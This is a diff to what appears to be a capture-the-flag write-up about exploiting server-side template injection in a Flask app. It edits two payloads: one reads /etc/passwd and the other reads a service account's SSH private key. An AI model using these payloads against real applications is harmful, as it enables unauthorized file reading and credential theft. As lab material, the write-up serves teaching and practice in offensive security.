@@ -71,7 +71,7 @@ This means that the application/server executed a simple 7x7 mathematic equation
 ## Foothold
 Moving to another level now, lets see if we can get the `/etc/passwd` file. Googling around we can find multiple web sites with Flask SSTI payloads, after trying a couple ones  I found [this](https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e) one to be working:
 ```python
-{%{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}%}
+{%{{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}}%}
 ```
 
 *While testing the SSTI payloads, I found out that some fonts works better than others, and we need to have a very clear screenshot of the payload. To circunvent this, I used [Figma](https://www.figma.com) to create my screenshots.*
@@ -130,8 +130,7 @@ svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
 
 Which seems to be an interesting user with a `home` and a bash tty. During the nmap scan we saw that the SSH port is open. Using a guessing game, we can try to retrieve the SSH private key for this user. The payload looks like this:
 ```
-{%{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read()  
-}}%}
+{%{{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}}%}
 ```
 
 I had to change the font to `Roboto` to make it work this time!
